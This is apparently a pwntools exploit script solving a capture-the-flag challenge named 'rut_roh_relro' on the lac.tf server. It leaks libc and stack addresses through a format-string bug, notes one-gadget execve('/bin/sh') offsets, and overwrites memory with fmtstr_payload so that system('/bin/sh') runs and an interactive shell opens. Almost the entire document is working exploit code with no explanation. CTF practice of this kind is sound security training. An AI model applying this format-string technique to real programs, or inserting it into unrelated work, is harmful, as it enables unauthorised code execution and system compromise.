#!/usr/bin/python3
from pwn import *

exe = './rut_roh_relro'
elf = context.binary = ELF(exe)
libc = ELF("libc.so.6")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

rem = True

if(not rem):
    p = start()
else:
    p = remote("lac.tf", 31134)

#stage1: leak libc elf address
p.recvuntil(b"?")
p.sendline(b"%p-"*80)
p.recvlines(2)

leak = p.recvline()
print(leak)

print(leak.split(b"-")[67])

libc.address = int(leak.split(b"-")[0], 16) - 1902371
log.info(f"libc: {hex(libc.address)}")
onegadu = libc.address + 0xc961a

stack = int(leak.split(b"-")[67], 16) - 232
# log.info(f"stack: {hex(stack)}")
# pause()
'''
0xc961a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc961d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc9620 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''

p.sendline(fmtstr_payload(6, {libc.address+1907088:b"/bin/sh\x00", stack: p64(libc.sym.system)}))

p.interactive()
'''

'''